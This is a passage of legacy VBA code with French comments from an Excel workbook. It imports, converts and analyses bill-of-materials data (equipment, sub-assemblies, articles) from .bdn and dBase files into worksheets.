            .Cells(Lig, 11).Value = lib_art
            .Cells(Lig, 12).Value = nom_int
            .Cells(Lig, 13).Value = ref_int
            .Cells(Lig, 14).Value = num_serie
            .Cells(Lig, 15).Value = Qte
            .Cells(Lig, 16).Value = Sacim
            .Cells(Lig, 17).Value = Obs
            .Cells(Lig, 18).Value = Note
            .Cells(Lig, 19).Value = piece_rech
            .Cells(Lig, 20).Value = Document
            .Cells(Lig, 21).Value = Tech
            .Cells(Lig, 25).Value = Ssenb + "_" + suf_ssen
        End With
        
    Loop
    Close #1
    mise_enforme (Lig)
End Sub

Sub import_bdn()
    Dim Fin As Boolean
    Dim i As Integer

    nb_element = 0
    design_err = 0
    ref_fab_err = 0
    nom_fab_err = 0
    fileToOpen = Application _
    .GetOpenFilename("Text Files (*.bdn), *.bdn")
    If fileToOpen <> False Then
        Chemin = fileToOpen
        lg = VBA.Len(fileToOpen)
        ' S|fffd|lection du fichier
         Fin = False
         While Not Fin
            If VBA.Mid(Chemin, lg, 1) = "\" Then
                Chemin = vbNullString
                For i = 1 To lg
                Chemin = Chemin + VBA.Mid(fileToOpen, i, 1)
                Next
                Fin = True
            Else
                lg = lg - 1
            End If
         Wend
        init_conv
        lit_equipmt
        lit_ssen
        lit_articles
    End If
End Sub


Sub trait_article()
    Dim i As Integer, Fin As Integer, Deb As Integer
    Dim Pl As String
    
    nbArticle = 0
    If Worksheets(shArticles).Cells(2, 1).Value <> vbNullString Then
        'Modif ACH V1.09b du 25/03/2008
        nbArticle = SheetCls.LastLineColumn(ThisWorkbook.Worksheets(shArticles), 1)
    End If
    num_serie = vbNullString
    Worksheets(shCde_Nomenclature).Activate
    For i = 2 To nbArticle
        With Worksheets(shArticles)
    '        If Worksheets(shArticles).Cells(i, 25).Value > vbnullstring Then
            If .Cells(i, 3).Value > vbNullString Then
    '            Pos_creat = Worksheets(shArticles).Cells(i, 25).Value
                Pos_creat = .Cells(i, 3).Value
            Else
                'pos_creat = pos_creat + 1
                Pos_creat = 0
            End If
            
            Ssenb = .Cells(i, 1).Value
            suf_ssen = .Cells(i, 2).Value
            NATURE = .Cells(i, 11).Value
            Tech = .Cells(i, 12).Value
            Sacim = .Cells(i, 4).Value
            Repere = .Cells(i, 14).Value
            Date_creat = .Cells(i, 45).Value
            Suffixe = vbNullString
            Document = VBA.Trim(.Cells(i, 17).Value)
            Select Case NATURE
            Case "B", "R"
                Ref_Four = VBA.Trim(.Cells(i, 5).Value)
                Suffixe = VBA.Trim(.Cells(i, 6).Value)
                Nom_Four = "RENAULT"
                ref_int = VBA.Trim(.Cells(i, 8).Value)
                nom_int = VBA.Trim(.Cells(i, 10).Value)
            Case "F"
                Ref_Four = VBA.Trim(.Cells(i, 8).Value)
                If Document = vbNullString Then Document = "SP"
                If Ref_Four = vbNullString Then
                    Ref_Four = VBA.Trim(.Cells(i, 7).Value)
                    Nom_Four = VBA.Trim(.Cells(i, 9).Value)
                    ref_int = vbNullString 'Trim(Worksheets(shArticles).Cells(i, 7).Value)
                    nom_int = VBA.Trim(.Cells(i, 9).Value)
                Else
                    Ref_Four = VBA.Trim(.Cells(i, 8).Value)
                    Nom_Four = VBA.Trim(.Cells(i, 10).Value)
                    ref_int = VBA.Trim(.Cells(i, 7).Value)
                    nom_int = VBA.Trim(.Cells(i, 9).Value)
                End If
            Case "C"
                If Document = vbNullString Then Document = "SP"
                Ref_Four = VBA.Trim(.Cells(i, 8).Value)
                Nom_Four = VBA.Trim(.Cells(i, 10).Value)
                ref_int = VBA.Trim(.Cells(i, 7).Value)
                nom_int = VBA.Trim(.Cells(i, 9).Value)
                
            Case Else
                Ref_Four = VBA.Trim(.Cells(i, 7).Value)
                Nom_Four = VBA.Trim(.Cells(i, 9).Value)
                ref_int = VBA.Trim(.Cells(i, 8).Value)
                nom_int = VBA.Trim(.Cells(i, 10).Value)
                If Document = vbNullString Then Document = "SP"
            End Select
            
            lib_art = VBA.Trim(.Cells(i, 13).Value)
            num_serie = VBA.Trim(.Cells(i, 35).Value)
            'document = Worksheets(shArticles).Cells(i, 17).Value
            'If document <> "SP" Then document = vbnullstring
            Qte = .Cells(i, 40).Value
            piece_rech = .Cells(i, 28).Value
            If piece_rech = "S" Then piece_rech = "N"
            Obs = .Cells(i, 19).Value
            Pl = vbNullString
            Deb = VBA.InStr(Obs, "#")
            If Deb > 0 Then
                Fin = VBA.InStr(Deb + 1, Obs, "#")
                If Fin > 0 Then
                    Pl = VBA.Mid(Obs, Deb + 1, Fin - Deb - 1)
                    Obs = VBA.Mid(Obs, Fin + 1)
                    Document = Pl
                End If
            Else
    '            suppression de recherche du plan sym|fffd|trique modif Pascal 12/09/2007
    '            If vba.instr(obs, "E2") > 0 Then Pl = vba.mid(obs, vba.instr(obs, "E2"), 10)
    '            If vba.instr(obs, "D0") > 0 Then Pl = vba.mid(obs, vba.instr(obs, "D0"), 10)
    '            If vba.instr(obs, "D1") > 0 Then Pl = vba.mid(obs, vba.instr(obs, "D1"), 10)
    '            If vba.instr(obs, "D2") > 0 Then Pl = vba.mid(obs, vba.instr(obs, "D2"), 10)
    '            If vba.instr(obs, "D3") > 0 Then Pl = vba.mid(obs, vba.instr(obs, "D3"), 10)
    '            If vba.instr(obs, "D3") > 0 Then Pl = vba.mid(obs, vba.instr(obs, "D5"), 10)
    '            If vba.instr(obs, "D6") > 0 Then Pl = vba.mid(obs, vba.instr(obs, "D6"), 10)
            End If
            If NATURE = "B" And Pl > vbNullString Then
                If Not Caracteres_Numeriques(VBA.Mid(3, 8)) Then Document = Pl
            End If
            ' Lors de l'export des donn|fffd|es du TDI vers RENOM, on a stock|fffd| le champ NOTE dans CHAMP1U / CHAMP2U / CHAMP1E car le champ NOTE n'existe plus dans la base
            Note = .Cells(i, 23).Value & .Cells(i, 24).Value & .Cells(i, 25).Value
        End With
        ecrit_article
    Next
End Sub

Sub trait_ssen()
    Dim i As Integer, Fin As Integer, Deb As Integer
    Dim Pl As String

    NbSSEN = 0
    If Worksheets(shSsEnsemble).Cells(3, 1).Value <> vbNullString Then
        'Modif ACH V1.09b du 25/03/2008
        NbSSEN = SheetCls.LastLineColumn(ThisWorkbook.Worksheets(shSsEnsemble), 1)
        Else: NbSSEN = 2
    End If
    'nbMat = nbMat + nbSsen
    num_serie = vbNullString
    Worksheets(shCde_Nomenclature).Activate
    For i = 2 To NbSSEN
        'pos_creat = Worksheets(shSsEnsemble).Cells(i, 4).Value
        'Sheets(shMateriels).Cells(i + 3+mat, 1).Value = i
        With Worksheets(shSsEnsemble)
           Inventaire = .Cells(i, 1).Value
           Suf_Inv = .Cells(i, 2).Value
           Ssenb = .Cells(i, 5).Value
           suf_ssen = .Cells(i, 6).Value
           Repere = .Cells(i, 7).Value
           lib_ssen = .Cells(i, 8).Value
           Pl = vbNullString
           Deb = VBA.InStr(lib_ssen, "#")
           If Deb > 0 Then
               Fin = VBA.InStr(Deb + 1, lib_ssen, "#")
               If Fin > 0 Then
                   Pl = VBA.Mid(lib_ssen, Deb + 1, Fin - Deb - 1)
                   lib_ssen = VBA.Trim(VBA.Mid(lib_ssen, Fin + 1))
                   Pos_creat = VBA.val(Pl)
               End If
           Else
               'pos_creat = pos_creat + 1
               Pos_creat = Lig + 100000
           End If
           Nom_integrateur = .Cells(1, 9).Value
           Nom_Four = .Cells(i, 9).Value
           Ref_mach = .Cells(i, 10).Value
           Qte = .Cells(i, 11).Value
           Date_creat = .Cells(i, 17).Value
        End With
        Ecrit_ssen
        ThisWorkbook.Sheets(shCde_Nomenclature).Cells(22, 3).Value = i
    Next
End Sub


Sub Trait_Equipmt(WsMat As Worksheet)
    Dim Pl As String
    Dim Deb, Fin As Integer

    Init_var_dec WsMat
    Worksheets(shCde_Nomenclature).Activate
    'ThisWorkbook.Sheets(shCde_Nomenclature).Cells(9, 12).Value = Nb_equ
    nbMat = 0
    If Worksheets(shEquipmt).Cells(1, 1).Value <> vbNullString Then
        'Modif ACH V1.09b du 25/03/2008
        nbMat = SheetCls.LastLineColumn(ThisWorkbook.Worksheets(shEquipmt), 1)
    End If
    nbMat = nbMat - 1
    'ThisWorkbook.Sheets(shAffaire).Range("Champ_Analyse_Dynamique").value = "N"

    Tri_ren_tdi = False
    
    For Lig = 4 To nbMat + 3
        'pos_creat = ThisWorkbook.Sheets(shEquipmt).Cells(lig - 2, 2).Value
        With ThisWorkbook.Sheets(shEquipmt)
            Inventaire = .Cells(Lig - 2, 3).Value
            Suf_Inv = .Cells(Lig - 2, 4).Value
            Nom_Four = .Cells(Lig - 2, 9).Value
            Lib_inv = .Cells(Lig - 2, 8).Value
            ' recup|fffd|ration du num|fffd|ro d'ordre
            '********************************
            Pl = vbNullString
            Deb = VBA.InStr(Lib_inv, "#")
            If Deb > 0 Then
                Fin = VBA.InStr(Deb + 1, Lib_inv, "#")
                If Fin > 0 Then
                    Pl = VBA.Mid(Lib_inv, Deb + 1, Fin - Deb - 1)
                    Lib_inv = VBA.Trim(VBA.Mid(Lib_inv, 1, 40))
                    Pos_creat = VBA.val(Pl)
                    Tri_ren_tdi = True
                End If
            Else
                'pos_creat = pos_creat + 1
                 Pos_creat = Lig + 100000
            End If
            '***********************************************************************
            Nom_integrateur = .Cells(Lig - 2, 9).Value
            Ref_mach = .Cells(Lig - 2, 10).Value
            Rep_inv = .Cells(Lig - 2, 6).Value
            Qte = 1
            num_serie = .Cells(Lig - 2, 11).Value
        End With
        With WsMat
            .Cells(Lig, 1).Value = Pos_creat 'lig - 3
            .Cells(Lig, P_Repere_Dec).Value = Rep_inv
            .Cells(Lig, P_Rep_complet_Dec).Value = "0"
            .Cells(Lig, P_Niveau_dec).Value = "E"
            .Cells(Lig, P_Categorie_Dec).Value = "F"
        
            Select Case VBA.Mid(Inventaire, 1, 2)
                Case "E1", "E2", "E3", "E4", "E5", "E6", "E7", "E8", "E9"
                    If VBA.Len(Inventaire) = 10 Then
                        .Cells(Lig, P_Categorie_Dec).Value = "B"
                        Nom_Four = "RENAULT"
                    End If
                Case "D0", "D1", "D2", "D3", "D4", "D5", "D6", "D7", "D8", "D9"
                    If VBA.Len(Inventaire) = 10 Then
                        .Cells(Lig, P_Categorie_Dec).Value = "B"
                        Nom_Four = "RENAULT"
                    End If
                Case "R9", "R1"
                    If VBA.Len(Inventaire) = 10 Then
                        .Cells(Lig, P_Categorie_Dec).Value = "R"
                        Nom_Four = "RENAULT"
                    End If
                Case Else
                
            End Select
               
            .Cells(Lig, P_Num_ssen_Dec).Value = Inventaire
            .Cells(Lig, P_Suf_ssen_Dec).Value = Suf_Inv
            .Cells(Lig, P_Etude_ref_Dec).Value = Inventaire
            .Cells(Lig, P_Etude_suf_Dec).Value = Suf_Inv
            
            .Cells(Lig, P_Etude_nom_Dec).Value = Nom_Four
            .Cells(Lig, P_design_Dec).Value = Lib_inv
            .Cells(Lig, P_Nom_Int_Dec).Value = Nom_integrateur
            .Cells(Lig, P_Ref_Int_Dec).Value = Ref_mach
            .Cells(Lig, P_Qte_Dec).Value = Qte
            .Cells(Lig, P_document_Dec).Value = "SP"
            .Cells(Lig, P_Code_EAN_Dec).Value = num_serie
            .Cells(Lig, P_CtrL_For_dec + 3).Value = "_" + Inventaire + "_" + Suf_Inv
            ThisWorkbook.Sheets(shCde_Nomenclature).Cells(21, 3).Value = Lig
            .Cells(Lig, P_CtrL_For_dec + 6).Value = Date_creat
            'WsMat.Cells(lig, P_CtrL_For_dec + 4).Value = pos_creat
        End With
        deb_mat = Lig
    Next
End Sub


Sub conv_dbf_TDI()
    Dim i, j, Lig, Ctxt As Integer
    Dim Msg, Style, Title, Reponse As Variant
    ' On d|fffd|sactive tout ce qui peut l'|fffd|tre
    GererConfiguration False
    
    Fic_dest = ActiveWorkbook.FullName
    j = 1
    i = 1
    Do While i <> 0
        i = VBA.InStr(j, Fic_dest, "\")
        j = j + 1
    Loop
    i = VBA.Len(Fic_dest) - j + 2
    Fic_dest = VBA.Right(Fic_dest, i)
    Fic_dest = VBA.Left(Fic_dest, i - 4)
    Chemin = Application.GetOpenFilename("Fichiers dbase (*.dbf), *.dbf", , "S|fffd|lectionner le fichier |fffd| integrer")
    If Chemin = False Then Exit Sub
    ' Supression des feuilles
    Application.DisplayAlerts = False
    On Error Resume Next
    Msg = "Souhaitez-vous supprimer les donn|fffd|es Nomenclature ?"    ' D|fffd|finit le message.
    Style = vbYesNo + vbCritical + vbDefaultButton2    ' D|fffd|finit les boutons.
    Title = "G|fffd|n|fffd|ration Nomenclature :"    ' D|fffd|finit le titre.
    'Help = "DEMO.HLP"    ' D|fffd|finit le fichier d'aide.
    Ctxt = 1000    ' D|fffd|finit le contexte de
    Reponse = MsgBox(Msg, Style, Title, "DEMO.HLP", Ctxt)
    If Reponse = vbYes Then    ' L'utilisateur a choisi Oui.
        deb_dec = 3
        deb_mat = 3
        deb_doc = 3
        Nb_equ = 0
        nb_ssen = 0
        Nb_art = 0
        Nb_FIDR = 0
        Nb_FIDD = 0
        Tri_ren_tdi = False
        With ThisWorkbook.Sheets(shCde_Nomenclature)
            .Cells(21, 3).Value = 0
            .Cells(22, 3).Value = 0
            .Cells(23, 3).Value = 0
            .Cells(24, 3).Value = 0
        End With
        
        ShowAllRecords (shEquipmt)
        With ThisWorkbook.Sheets(shEquipmt).Rows("1:65536")
            .Delete
            .NumberFormat = "@"
        End With
        '
            
        ShowAllRecords (shSsEnsemble)
        With ThisWorkbook.Sheets(shSsEnsemble).Rows("1:65536")
            .Delete
            .NumberFormat = "@"
        End With
        '
        
        ShowAllRecords (shArticles)
        With ThisWorkbook.Sheets(shArticles).Rows("1:65536")
            .Delete
            .NumberFormat = "@"
        End With
    
    Else
        Exit Sub
    End If

    fichier_travail = Chemin
    j = 1
    i = 1
    Do While i <> 0
        i = VBA.InStr(j, fichier_travail, "\")
        j = j + 1
    Loop
    i = VBA.Len(fichier_travail) - j + 2
    fichier_travail = VBA.Right(fichier_travail, i)
    fichier_travail = VBA.Left(fichier_travail, i - 4)

    Chemin = VBA.Left(Chemin, VBA.Len(Chemin) - i)
    ThisWorkbook.Sheets(shCde_Nomenclature).Cells(28, 4).Value = VBA.Date & " - " & VBA.Time
    
    '*****************
    ' Feuille equipmt
    '*****************
    Workbooks.Open Filename:=Chemin & "equipmt.dbf"
    Fic_tra = shEquipmt & ".dbf"
    nb_max_lig = 0
    If Workbooks(Fic_tra).Worksheets(shEquipmt).Cells(2, 1) > vbNullString Then
        nb_max_lig = SheetCls.LastLineColumn(Workbooks(Fic_tra).Worksheets(shEquipmt), 1)
    End If
    For i = 1 To nb_max_lig
        val_range = VBA.LTrim(VBA.Str(i))
        val_range = "A" + val_range + ":AZ" + val_range
        With ThisWorkbook.Sheets(shEquipmt).Range(val_range)
            .Value = Workbooks("equipmt.dbf").Sheets(shEquipmt).Range(val_range).Value
            val_range = VBA.LTrim(VBA.Str(i))
            val_range = "A" + val_range + ":AZ" + val_range
            .Font.Color = vbBlack
            .Font.Bold = False
        End With
    Next i
    Windows("Equipmt.dbf").Close
    
    '*****************
    ' Feuille ssen
    '*****************
    Workbooks.Open Filename:=Chemin & "ssen.dbf"
    ' copie des feuilles de travail
    Fic_tra = shSsEnsemble & ".dbf"
    nb_max_lig = 0
    If Workbooks(Fic_tra).Worksheets(shSsEnsemble).Cells(2, 1) > vbNullString Then
        nb_max_lig = SheetCls.LastLineColumn(Workbooks(Fic_tra).Worksheets(shSsEnsemble), 1)
    End If
    For i = 1 To nb_max_lig
        val_range = VBA.LTrim(VBA.Str(i))
        val_range = "A" + val_range + ":AZ" + val_range
        With ThisWorkbook.Sheets(shSsEnsemble).Range(val_range)
            .Value = Workbooks("ssen.dbf").Sheets(shSsEnsemble).Range(val_range).Value
            val_range = VBA.LTrim(VBA.Str(i))
            val_range = "A" + val_range + ":AZ" + val_range
            .Font.Color = vbBlack
            .Font.Bold = False
        End With
    Next i
    Windows("ssen.dbf").Close
    
    '*****************
    ' Feuille articles
    '*****************
    'ouverture fichier travail choisi
    Workbooks.Open Filename:=Chemin & "nomencl.dbf"
    ' copie des feuilles de travail
    nb_max_lig = 0
    If Workbooks("nomencl.dbf").Worksheets("nomencl").Cells(2, 1) > vbNullString Then
        nb_max_lig = SheetCls.LastLineColumn(Workbooks("nomencl.dbf").Worksheets("nomencl"), 1)
    End If
    For i = 1 To nb_max_lig
        val_range = VBA.LTrim(VBA.Str(i))
        val_range = "A" + val_range + ":AZ" + val_range
        ThisWorkbook.Sheets(shArticles).Range(val_range).Value = _
        Workbooks("nomencl.dbf").Sheets("nomencl").Range(val_range).Value
        val_range = VBA.LTrim(VBA.Str(i))
        val_range = "A" + val_range + ":AZ" + val_range
    Next i
    Windows("nomencl.dbf").Close
    ' On efface les donnees des onglets Materiel et Document
    With Worksheets(shMateriels).Range("4:65536")
        .Delete
        .NumberFormat = "@"
    End With
    With Worksheets(shDocuments).Range("4:65536")
        .Delete
        .NumberFormat = "@"
    End With
    Application.ScreenUpdating = True
    Worksheets(shCde_Nomenclature).Activate
    ThisWorkbook.Sheets(ShAffaire).Range("Champ_Analyse_Dynamique").Value = "N"
    Application.ScreenUpdating = False
    ' On recharge les donnees
    Trait_Equipmt ThisWorkbook.Worksheets(shMateriels)
    trait_ssen
    trait_article
    mise_enforme (Lig)
    ThisWorkbook.Sheets(ShAffaire).Range("Champ_Analyse_Dynamique").Value = "O"
    ' On active tout ce qui doit l'|fffd|tre
    GererConfiguration False
    Application.DisplayAlerts = True
    
    On Error GoTo 0
End Sub
Attribute VB_Name = "TDI_Export_Renom_Bdn"
Option Explicit

'[---------------------------------------------------------------------------
'[Identifiant   :
'[Auteur        : Joel Martin
'[Service       : SIMPM - Sce 65931
'[Date cr|fffd|ation : 06/07/2005
'[Version       : V1.6 du 16/04/2009
'[---------------------------------------------------------------------------
'[Sujet:
'[---------------------------------------------------------------------------


' ***********************
' Auteur 65931/UET C /JM
' Version Module 1.00.00
' Date 06-07-05
' ***********************
' Reprise contr|fffd|le sur champ rep|fffd|re plus obligatoire
' modif 16-02-2007 reprise num|fffd|rotation des |fffd|quipements
' Modif fonction analyse Pb sur documents 30-03-2007 : JM

'Pas d'anomalie
Const Msg_Nomenclature_OK = "Nom_Ok"
Const Msg_Materiel_OK = "Mat_Ok"
Const Msg_Document_OK = "Doc_Ok"

Const Msg_Nomenclature_NC = "Nom_NC"
Const Msg_Materiel_NC = "Mat_NC"

'Codes Anomalies
Const Msg_Dec_Nok = "Dec_NOK"
Const Msg_Nomenclature_NOK = "Nom_NOk"
Const Msg_Materiel_NOK = "Mat_NOk"
Const Msg_Document_NOK = "Doc_NOk"
Const Msg_Nomenclature_Exist = "Nom_Exist"
Const Msg_Materiel_Exist = "Mat_Exist"
Const Msg_Document_Exist = "Doc_Exist"
Const Msg_E_Multiple = "E-Multiple"

Const Msg_Doublon_SSen = "Ssen en doublon"
Const Msg_Lien_Nok = "Lien_hi|fffd|rarchique_NOK"
Const Msg_Suffixe_Absent = "Suffixe (P14) Absent"

Dim P_document
Dim P_rep_complet As String
Dim Clef_complete As String

Dim ref_int  As String
Dim nom_int  As String
Dim Document As String
Dim nb_document As Integer

Dim Col As Integer
Dim Lig As Long
'Dim ind           As Integer

'Dim nb_ligne_std     As Integer
Dim Num_ligne        As Variant
Private ind_equipmt As Integer
Private ind_ssen As Integer
Private ind_articles    As Long

Dim i As Integer
Dim ind_tab_ssen As Integer
Dim ind_tab_ssen_ssen As Integer


'   Donn|fffd|es equipmt
'*******************
Dim N_invent As String
Dim N_suffixe As String
Dim N_mat      As String
Dim lib_tn2
Dim cod_class

Dim lib_invent
Dim lib_mat
Dim nom_four_equ
Dim ref_mach_equ

'   Donn|fffd|es ssen
'*******************
Dim num_ssen As String
Dim suf_ssen As String

Dim clas_ssen
    
Dim lib_ssen
Dim Nom_Four
Dim Ref_Four
Dim qte_ssen

'   Donn|fffd|es article
'*******************
Dim NATURE
Dim Tech
Dim Repere
Dim PlanMABEC
Dim suf_mab
Dim ind_plan
Dim for_plan
Dim nb_planche
Dim nom_fab
Dim ref_fab
Dim Design
Dim num_serie
Dim qte_articles
Dim Obs
Dim Note
Dim piece_rech
Dim SACIMMABEC

Dim Niveau
Dim etude_ref
Dim etude_suf

Dim Date_creat As String
Dim Pos_creat As Variant

'Dim Jour    As String
'Dim Mois    As String
'Dim Annee   As String
'Dim Time_h As String
'Dim Time_mm As String

Dim Nb_element_bdn

' pointeur donn|fffd|e Materiels
'*****************************************************

Dim P_num_ligne
Dim P_etat
Dim P_div
Dim P_met
Dim P_ligne
Dim P_efp
Dim P_fp
Dim P_sfp
Dim P_op
Dim P_lib_pt
Dim P_ilot
Dim P_zone
Dim P_rep_equ
Dim P_ssen_prin As Integer

Dim P_ssen_suff As Integer
Dim P_SMP
Dim P_niveau
Dim P_simon
Dim P_categorie
Dim P_nomencl    As Integer

Dim P_etude_ref
Dim P_etude_suf
Dim P_etude_nom
Dim P_design
Dim P_lib_mat


Dim P_ref_int ' non recup|fffd|r|fffd|
Dim P_nom_int ' non recup|fffd|r|fffd|
Dim P_num_serie
Dim P_sacimmabec
Dim P_qte
Dim P_obs
Dim P_note
Dim P_piece_rech
Dim P_tech
Dim P_ano_lien
Dim P_Remarques

Dim Onglet           As String
Dim Nomencl          As String

Dim acc
Dim acc1
Dim acc2
Dim apf
Dim bed
Dim bedr

Dim ind_tab_equipmt As Integer
Dim mem_equipmt As String
Dim mem_inv As String
Dim mem_inv_suf As String
Dim mem_ssen As String


Dim Tab_equipmt_cle(1 To 5000)   As String
Dim Tab_equipmt_ong(1 To 5000)   As String
Dim Tab_equipmt_adr(1 To 5000) As Integer
Dim Nb_equip_dec As Long

Dim Tab_ssen(1 To 10000)   As String
Dim Tab_ssen_ssen(1 To 20000)    As String
Dim Tab_for_decoup(0 To 50) As Integer

'********************************
' data Conv_Renom
'*********************************
Dim Chemin As String
Dim Fic_nomencl As String
Dim Fic_ssen As String
Dim Fic_equipmt As String

Dim Fic_statut As String


Dim Tab_exp          As String



'********************
'Analyse Nomenclature
'********************
Sub Analyse_Formats_Et_Liens()
    Dim Jour As String, Mois As String, Annee As String, Time_h As String
    
    Application.EnableEvents = False
    frmProgression.UpdateProgress 0, IniCls.ReadStringIniLangage("MsgFWK", "MsgEnCours"), 0
    Initialisation_Compteurs_Analyse

    Application.ScreenUpdating = False
    ThisWorkbook.Sheets(ShAffaire).Range("Champ_Analyse_Dynamique").Value = "N"

    Renumerotation_Numeros_Ordre shDecoupage
    Renumerotation_Numeros_Ordre shMateriels
    Renumerotation_Numeros_Ordre shDocuments

    'nettoyage des feuilles
    Worksheets(shEquipmt).Rows("2:65536").Delete
    Worksheets(shEquipmt).Rows("2:65536").NumberFormat = "@"
    Worksheets(shSsEnsemble).Rows("2:65536").Delete
    Worksheets(shSsEnsemble).Rows("2:65536").NumberFormat = "@"
    Worksheets(shArticles).Rows("2:65536").Delete
    Worksheets(shArticles).Rows("2:65536").NumberFormat = "@"

    Jour = Day(VBA.Date)
    Mois = Month(VBA.Date)
    Annee = Year(VBA.Date)
    Time_h = Hour(VBA.Time)
    'Time_mm = Minute(Time)
    If VBA.Len(Jour) < 2 Then Jour = "0" + Jour
    If VBA.Len(Mois) < 2 Then Mois = "0" + Mois
    'If vba.len(Annee) > 2 Then Annee = vba.mid(Annee, 3, 2)
    Date_creat = Jour + Mois + Annee

    Pos_creat = 0 'Int((99999 * Rnd)) * 100000
    ind_ssen = 1
    ind_articles = 1
    ind_equipmt = 1
    ind_tab_equipmt = 0
    
    nb_document = 0
    Nb_element_bdn = 0

    'Effacer les codes Erreurs des 3 onglets
    Effacement_Codes_Erreurs

    ThisWorkbook.Worksheets(shCde_Nomenclature).Activate

    ' traitement feuille Decoupage
    Onglet = shDecoupage
    cod_class = "Dec" ' On force le code classe qui devient la colonne Rep|fffd|re de la feuille Mat|fffd|riel lors de l'import RENOM->TDI
    Init ThisWorkbook.Worksheets(shDecoupage)

    Init_var_dec ThisWorkbook.Worksheets(shDecoupage)
    ThisWorkbook.Worksheets(shCde_Nomenclature).Activate
    charge_Process Onglet
    Largeur_Colonnes_Decoupage Onglet

    ' traitement feuille Materiels
    ind_tab_ssen = 0
    ind_tab_ssen_ssen = 0

    Onglet = shMateriels
    cod_class = vbNullString
    Init ThisWorkbook.Worksheets(shMateriels)
    Init_var_dec ThisWorkbook.Worksheets(shMateriels)
    ThisWorkbook.Worksheets(shCde_Nomenclature).Activate
    charge_Process Onglet
    Largeur_Colonnes_Mat_doc Onglet

    ' ctl_doublon_art

    ' traitement des documents
    Onglet = shDocuments
    Init_var_dec ThisWorkbook.Worksheets(shDocuments)
    ThisWorkbook.Worksheets(shCde_Nomenclature).Activate
    charge_Process Onglet

    Recherche_Doublons_Documents False
    
    Largeur_Colonnes_Mat_doc Onglet
    'Ctrl_exist_dec
    'charge_Document
    Application.ScreenUpdating = True
    ThisWorkbook.Sheets(ShAffaire).Range("Champ_Analyse_Dynamique").Value = "O"
    ThisWorkbook.Worksheets(shCde_Nomenclature).Activate
    
    'Date et Heure d'analyse
    ThisWorkbook.Sheets(shCde_Nomenclature).Cells(11, 2).Value = VBA.Date & "-" & VBA.Time
    
    If frmProgression.FlagAbandon = 0 Then frmProgression.UpdateProgress 1, IniCls.ReadStringIniLangage("MsgFWK", "MsgTermine"), 0 Else Initialisation_Compteurs_Analyse
    Application.EnableEvents = True
End Sub


Sub Initialisation_Compteurs_Analyse()
    'Date et Heure d'analyse
    ThisWorkbook.Sheets(shCde_Nomenclature).Cells(11, 2).Value = vbNullString 'VBA.Date & "-" & VBA.Time
    
    Compteur_Ano_Dec = 0
    Compteur_Ano_Mat = 0
    Compteur_Ano_Doc = 0
    Compteur_Ano_Pdr = 0
    Compteur_Ano_Lien = 0
    
    'Nombre de Lignes
    ThisWorkbook.Sheets(shCde_Nomenclature).Cells(12, 3).Value = 0
    ThisWorkbook.Sheets(shCde_Nomenclature).Cells(13, 3).Value = 0
    ThisWorkbook.Sheets(shCde_Nomenclature).Cells(14, 3).Value = 0
    
    'Nombre d'anomalies
    ThisWorkbook.Sheets(shCde_Nomenclature).Cells(12, 4).Value = 0
    ThisWorkbook.Sheets(shCde_Nomenclature).Cells(13, 4).Value = 0
    ThisWorkbook.Sheets(shCde_Nomenclature).Cells(14, 4).Value = 0
    ThisWorkbook.Sheets(shCde_Nomenclature).Cells(15, 4).Value = "*" 'Compteur_Ano_Lien

End Sub


Sub Init(wS As Worksheet)
    Dim ind_col As Integer, ind As Integer
    ' Initialisation des variables
    P_num_ligne = 1
    P_etat = 2
    P_div = 3
    P_met = 4
    P_ligne = 5
    P_efp = 6
    P_fp = 7
    P_sfp = 8
    P_op = 9
    P_lib_pt = 10
    P_ilot = 11
    P_zone = 12
    P_rep_equ = 13
    P_rep_complet = 14
    
    'P_cod_class = 15
    P_SMP = 15
    ' point de pose
    P_niveau = 17
    P_simon = 18
    ' date de modif  p_date_maj
    P_categorie = 20
    
    'P_lib_fonc_equi = 19
    
    P_nomencl = 21
    P_etude_ref = 22
    P_etude_suf = 23
    P_etude_nom = 24
    P_design = 25
    
    P_ref_int = 30 ' non recup|fffd|r|fffd|
    P_nom_int = 31 ' non recupere
    P_num_serie = 32
    P_qte = 33
    P_sacimmabec = 34
    
    'P_lib_fonc = 39
    'P_N_mat = 40
    'P_lib_mat = 29
    P_obs = 41
    P_note = 42
    P_piece_rech = 43
    
    P_document = 44
    P_tech = 45
    P_ano_lien = 46
     
    acc = "C"
    acc1 = "C"
    acc2 = "C"
    apf = "F"
    bed = "B"
    bedr = "R"

    ind = 1
    Do
        ind_col = VBA.val(VBA.UCase(wS.Cells(1, ind).Value))
        If ind_col = 0 Then P_num_ligne = ind
        If ind_col = 1 Then P_etat = ind
        If ind_col = 2 Then P_div = ind
        If ind_col = 3 Then P_met = ind
        If ind_col = 4 Then P_ligne = ind
        If ind_col = 5 Then P_efp = ind
        If ind_col = 6 Then P_fp = ind
        If ind_col = 7 Then P_sfp = ind
        If ind_col = 8 Then P_op = ind
        If ind_col = 9 Then P_lib_pt = ind
        If ind_col = 10 Then P_ilot = ind
        If ind_col = 11 Then P_zone = ind
        If ind_col = 12 Then P_rep_equ = ind
        If ind_col = 13 Then P_ssen_prin = ind
        If ind_col = 14 Then P_ssen_suff = ind
        If ind_col = 16 Then P_niveau = ind
        If ind_col = 17 Then P_simon = ind
        If ind_col = 19 Then P_categorie = ind
        If ind_col = 20 Then P_nomencl = ind
        If ind_col = 21 Then P_etude_ref = ind
        If ind_col = 22 Then P_etude_suf = ind
        If ind_col = 23 Then P_etude_nom = ind
        If ind_col = 24 Then P_design = ind
        If ind_col = 40 Then P_lib_mat = ind ' prendre le libelle fonct
        If ind_col = 29 Then P_ref_int = ind ' non recup|fffd|r|fffd| ok
        If ind_col = 30 Then P_nom_int = ind ' non recup|fffd|re ok
        If ind_col = 31 Then P_num_serie = ind
        If ind_col = 32 Then P_qte = ind
        If ind_col = 33 Then P_sacimmabec = ind
        If ind_col = 40 Then P_obs = ind ' ok
        If ind_col = 41 Then P_note = ind
        If ind_col = 42 Then P_piece_rech = ind
        If ind_col = 43 Then P_document = ind
        If ind_col = 44 Then P_tech = ind
        If ind_col = 46 Then P_ano_lien = ind
        ind = ind + 1
    Loop Until ind > 47

    Tab_for_decoup(0) = 5
    Tab_for_decoup(1) = 2
    Tab_for_decoup(2) = 4
    Tab_for_decoup(3) = 1
    Tab_for_decoup(4) = 3
    Tab_for_decoup(5) = 3
    Tab_for_decoup(6) = 4
    Tab_for_decoup(7) = 4
    Tab_for_decoup(8) = 4
    Tab_for_decoup(9) = 40
    Tab_for_decoup(10) = 2
    Tab_for_decoup(11) = 1
    Tab_for_decoup(12) = 8
    Tab_for_decoup(13) = 100
